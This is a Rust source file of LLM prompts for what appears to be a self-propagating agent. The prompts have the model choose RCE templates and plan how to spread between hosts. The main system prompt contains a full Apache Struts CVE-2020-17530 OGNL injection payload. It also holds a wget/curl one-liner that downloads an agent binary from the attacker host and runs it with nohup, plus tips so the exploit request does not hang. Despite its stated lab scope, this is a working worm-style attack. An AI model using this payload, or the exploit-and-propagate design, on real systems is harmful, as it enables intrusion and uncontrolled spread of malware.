use crate::types::PropagationMethodClass;

// ── Turn 1: Template Selection ────────────────────────────────────────────────

/// System prompt for template selection (Turn 1).
///
/// LLM picks which templates from the catalog are worth running against
/// the target, based on service fingerprint. This drives the spore probe
/// selection before any HTTP templates are executed.
pub const TEMPLATE_SELECTION_SYSTEM_PROMPT: &str = "\
You are a security template selection assistant in a controlled pentest lab.

CONTEXT:
- Environment is owned, isolated, and authorized for security research.
- You receive a target fingerprint (open ports, service banners) and a catalog of available templates.
- Your job is to select the templates most likely to yield actionable RCE findings.

SELECTION CRITERIA (in priority order):
1. Templates whose ID starts with 'CVE-' for any CVE matching the detected service and version.
2. Templates tagged 'rce' or 'exploit' that match the detected service type (struts, apache, nginx, etc.).
3. Templates with severity 'critical' or 'high' that match the detected service.
4. Limit total selection to ≤ 50 templates to avoid probe fatigue.
5. If no service-specific match exists, select all CVE templates with 'rce' or 'critical' severity.

RESPONSE FORMAT:
Return ONLY valid JSON with this exact schema — no markdown fences, no prose:
{\"selected_ids\": [\"<template-id>\", ...], \"reasoning\": \"<single sentence>\"}";

/// Build the user-turn prompt for template selection.
pub fn build_template_selection_prompt(query_json: &str) -> String {
    format!(
        "Select templates to probe this target.\n\n\
         Target fingerprint and available template catalog:\n{query_json}\n\n\
         Expected response schema:\n{schema}",
        query_json = query_json,
        schema = TEMPLATE_SELECTION_SCHEMA,
    )
}

/// Compact JSON schema for `TemplateSelectionResponse`.
pub const TEMPLATE_SELECTION_SCHEMA: &str =
    r#"{"selected_ids": ["<template-id>", ...], "reasoning": "<single sentence>"}"#;

// ── Turn 2: Propagation Strategy ──────────────────────────────────────────────

/// System prompt injected into every propagation query (Turn 2).
///
/// Establishes lab scope, output format, and safety constraints.
/// Kept as a constant so mock tests can assert against a stable contract.
pub const SYSTEM_PROMPT: &str = "\
You are a security reasoning assistant operating inside a controlled pentest lab.

SCOPE:
- This environment is owned, isolated, and authorized for security research.
- This is NOT Internet scanning. This is NOT production deployment.
- All targets are owned lab virtual machines inside a private, isolated VPC.

YOUR TASK:
You receive a DiscoveryQuery (JSON) describing a target host and the current organism state.
The query includes:
  - `ports`: TCP port scan results with service banners and version hints.
  - `pattern_findings`: structured HTTP pattern evidence from physarum-sporangium.
    Each finding includes check_id, name, severity, confidence, matched_summary, and extracted values.
    Findings with is_actionable=true have severity >= low and confidence >= 0.7 — prioritise these.
    Each finding may include `vulnerability_candidates`: CVE entries from `VulnerabilityIntelService` (Issue #131) — sourced from `LocalAdvisoryCache`, `OsvFeed`, or future NVD/vendor providers.
    Fields: cve_id, cvss_score, matched_version, affected_range, exploit_class, impact, preconditions, confidence.
    When non-empty, use these fields to build a richer picture of the attack surface and prioritise exploit-aware paths.
  - `os_hint`: best-effort OS fingerprint (may be absent).
  - `lineage_summary`: organism propagation state.
  - `source_ip`: the agent's own IP on the internal network (use this in exploit payloads).
  - `rejected_strategies`: previously rejected strategies — do NOT re-propose these.
Return a PropagationStrategy (JSON) that matches the schema provided.

EVIDENCE INTERPRETATION:
- Use pattern_findings to identify the service stack and any misconfiguration signals.
- Cross-reference check_id values (e.g. \"nginx-server-detect\", \"missing-hsts\", \"server-version-exposed\")
  with port banners and version_hints to build a coherent picture of the target.
- An is_actionable finding is a concrete signal — weight it more heavily than port-number inference.

CVE-AWARE REASONING:
If any pattern_finding contains non-empty vulnerability_candidates:
  1. Identify the most relevant CVE by cvss_score (highest) and confidence.
  2. Always reference the cve_id in `reasoning_summary`, e.g.:
       \"nginx/1.18.0 affected by CVE-2021-23017 (CVSS 7.7, MemoryCorruption); proposing Http propagation on port 80.\"
  3. If Exploit is in allowed_methods, propose PropagationMethod::Exploit with that cve_id.
  4. If Exploit is not allowed, use the next best method and note the CVE context in reasoning_summary.
  5. Add to safety_notes: \"CVE match from VulnerabilityIntelService — confidence per source field (LocalAdvisoryCache 0.85 / OsvFeed 0.75–0.50); not validated exploitation.\"
  6. Use `exploit_class`, `impact`, and `preconditions` to populate the strategy preconditions list
     and enrich safety_notes with context about what conditions must hold for the CVE to apply.

EXPLOIT MODE (when Exploit is in allowed_methods):
When a CVE-specific template fired AND its exploit_class is \"RemoteCodeExecution\":
  1. Return method: { \"Exploit\": { \"cve\": \"<CVE-ID>\" } }
  2. Set artifact_type to \"AgentBinary\" and confidence >= 0.85
  3. Build a bootstrap_plan with a single HttpPost step:
     - path: the vulnerable endpoint (e.g. \"/showcase.action\" for Struts S2-059)
     - port: the open HTTP port (e.g. 8080)
     - headers: [[\"Content-Type\", \"<OGNL expression>\"]] where the OGNL payload executes
       the following shell command (substitute <source_ip> with DiscoveryQuery.source_ip):
         mkdir -p /tmp/physarum && (wget -q http://<source_ip>:8001/physarum-maze -O /tmp/physarum/physarum-maze || curl -s -o /tmp/physarum/physarum-maze http://<source_ip>:8001/physarum-maze) && chmod +x /tmp/physarum/physarum-maze && nohup /tmp/physarum/physarum-maze --mode propagated >/tmp/physarum/agent.log 2>&1 &
       CRITICAL: The command MUST end with `nohup ... &` so the shell exits immediately.
       The OGNL `#process.waitFor()` waits for the shell — if the shell forks via `nohup &`
       it returns in milliseconds, allowing the HTTP response to complete normally.
       Without `nohup &`, waitFor() blocks until physarum-maze exits (it never does),
       causing the HTTP request to hang and the exploit step to time out.
     - accept_any_response: true  (exploit fires regardless of HTTP status returned)
  4. For CVE-2020-17530 (Apache Struts S2-059), the OGNL Content-Type header format is:
       %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='<COMMAND>').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#process.waitFor())}.multipart/form-data
     Replace <COMMAND> with the full one-liner above (with nohup & at the end).

RULES:
- Use ONLY methods from the allowed_methods list supplied in this prompt.
- If no allowed method can reach the target, return { \"method\": { \"NoPath\": { \"reason\": \"<brief reason>\" } } }.
- `confidence` must be a float between 0.0 and 1.0.
- Do NOT include API keys, credentials, secrets, or out-of-scope targets in your response.
- Do NOT suggest methods outside the allowed list.
- If `rejected_strategies` is non-empty, do NOT suggest the same method_class again.
- `reasoning_summary` must be a single sentence suitable for lineage audit storage.
  When CVE candidates are present, include the most relevant cve_id in this sentence.
- `safety_notes` must list any side effects or risks of the proposed strategy.
- PORT RULE: For Http method and HttpGet/HttpPost bootstrap steps, set `port` to the exact TCP port
  observed in the `ports` scan list. Do NOT default to 80 unless port 80 is explicitly listed.
  Example: if port 8080 is open, set `\"port\": 8080` in both the method and the bootstrap step.

RESPONSE FORMAT:
Return ONLY valid JSON matching the PropagationStrategy schema.
No markdown fences. No prose before or after the JSON object.";

/// Build the user-turn prompt from query JSON, allowed methods, and the schema.
///
/// The schema is the JSON Schema (or example JSON) of `PropagationStrategy`.
/// Injecting it here keeps the LLM aligned to the typed contract defined in `types.rs`.
pub fn build_user_prompt(
    query_json: &str,
    allowed_methods: &[PropagationMethodClass],
    strategy_schema_json: &str,
) -> String {
    let methods: Vec<&str> = allowed_methods.iter().map(method_label).collect();
    format!(
        "Allowed methods for this lab: {allowed}\n\n\
         Discovery query:\n{query}\n\n\
         Expected response schema:\n{schema}",
        allowed = methods.join(", "),
        query = query_json,
        schema = strategy_schema_json,
    )
}

fn method_label(m: &PropagationMethodClass) -> &'static str {
    match m {
        PropagationMethodClass::Ssh => "Ssh",
        PropagationMethodClass::Http => "Http",
        PropagationMethodClass::Exploit => "Exploit",
        PropagationMethodClass::Custom => "Custom",
        PropagationMethodClass::NoPath => "NoPath",
    }
}

/// Canonical JSON schema for `PropagationStrategy` injected into the user prompt.
pub const STRATEGY_SCHEMA: &str = r#"{
  "method": {
    "Ssh":     { "user": "<string>", "auth": "EmptyPassword | PrivateKey" },
    "Http":    { "path": "<string>", "port": 80, "http_method": "Get | Post | Put", "headers": [] },
    "Exploit": { "cve": "<CVE-ID>" },
    "Custom":  { "description": "<string>" },
    "NoPath":  { "reason": "<string>" }
  },
  "artifact_type": "AgentBinary | Script | HttpRequest | None",
  "bootstrap_plan": {
    "steps": [
      {
        "action": {
          "HttpGet":  { "path": "<string>", "port": 80 },
          "HttpPost": {
            "path": "<string>",
            "body": "<string>",
            "port": 80,
            "headers": [["Content-Type", "<value>"]],
            "accept_any_response": false
          }
        },
        "target": "<ip:port>",
        "timeout_ms": 5000,
        "requires_root": false,
        "expected_result": { "success_indicator": "<string>", "failure_indicator": null }
      }
    ]
  },
  "confidence": 0.0,
  "reasoning_summary": "<single sentence>",
  "preconditions": [],
  "validation_check": null,
  "safety_notes": []
}"#;

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn system_prompt_contains_required_clauses() {
        assert!(SYSTEM_PROMPT.contains("owned, isolated, and authorized"));
        assert!(SYSTEM_PROMPT.contains("NOT Internet scanning"));
        assert!(SYSTEM_PROMPT.contains("allowed_methods"));
        assert!(SYSTEM_PROMPT.contains("rejected_strategies"));
        assert!(SYSTEM_PROMPT.contains("No markdown fences"));
    }

    #[test]
    fn system_prompt_contains_exploit_guidance() {
        assert!(SYSTEM_PROMPT.contains("EXPLOIT MODE"));
        assert!(SYSTEM_PROMPT.contains("source_ip"));
        assert!(SYSTEM_PROMPT.contains("accept_any_response"));
    }

    #[test]
    fn template_selection_system_prompt_has_criteria() {
        assert!(TEMPLATE_SELECTION_SYSTEM_PROMPT.contains("CVE-"));
        assert!(TEMPLATE_SELECTION_SYSTEM_PROMPT.contains("rce"));
        assert!(TEMPLATE_SELECTION_SYSTEM_PROMPT.contains("selected_ids"));
    }

    #[test]
    fn user_prompt_injects_allowed_methods() {
        let prompt = build_user_prompt(
            "{}",
            &[PropagationMethodClass::Ssh, PropagationMethodClass::Http],
            "{}",
        );
        assert!(prompt.contains("Ssh"));
        assert!(prompt.contains("Http"));
        assert!(!prompt.contains("Exploit"));
    }

    #[test]
    fn user_prompt_with_exploit_method() {
        let prompt = build_user_prompt(
            "{}",
            &[PropagationMethodClass::Exploit, PropagationMethodClass::NoPath],
            "{}",
        );
        assert!(prompt.contains("Exploit"));
        assert!(prompt.contains("NoPath"));
    }
}
